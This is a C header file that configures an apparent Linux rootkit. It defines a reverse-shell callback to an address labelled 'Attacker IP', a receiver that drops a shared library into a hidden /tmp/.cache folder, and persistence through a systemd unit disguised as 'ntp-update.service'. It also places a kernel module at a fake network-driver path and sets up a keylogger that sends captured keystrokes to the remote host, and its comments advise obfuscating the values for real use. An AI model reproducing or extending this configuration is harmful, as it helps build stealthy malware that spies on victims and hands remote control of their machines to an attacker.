// config.h
#ifndef CONFIG_H
#define CONFIG_H

// "-DDEBUG" in Makefile
#ifdef DEBUG
    #include <stdio.h>
    #define DBG_PRINT(...) do { printf(__VA_ARGS__); } while (0)
    #define PERROR(msg)    perror(msg)
#else
    #define DBG_PRINT(...) do {} while (0)
    #define PERROR(msg)    do {} while (0)
#endif

// Replace these with your actual values
// Values should be at least XORed in real usage

// Revese shell
#define REMOTE_IP "10.0.2.2" // Attacker IP
#define REMOTE_PORT 4443
#define RECONNECT_DELAY 10 // Seconds between reconnects

// Receiver helper
#define MOD_SIG_PORT 6677 // Port for signaling to rootkit
#define MOD_SIG_PAYLOAD 0xec4effc // rootkit_rec_signal_
#define PORT 9000 // Port to receive an ELF or .so
#define BUF_SIZE 4096
#define FOLDER_PATH "/tmp/.cache"
#define FILE_PATH FOLDER_PATH "/libudev.so"

// Persistency + remove_module 
#define SERVICE_NAME "ntp-update.service"
#define SERVICE_FILE "/etc/systemd/system/" SERVICE_NAME
#define MODULE_NAME "rootkit_module"
#define MODULE_PATH "/lib/modules/%s/kernel/drivers/net/debug_netlinkx.ko" // Kernel module path
#define REC_FILE "/var/lib/.cache/udevd-sync"

// Keylog sender
#define KEYLOG_PATH "/proc/keylog" // Change this (also in module config.h)
#define BUFFER_SIZE 8192
#define KEYLOG_SERVER_IP REMOTE_IP
#define KEYLOG_PORT 4442
#define IS_LIVE 0 // Set to 1 for live keylogging

#endif // CONFIG_H
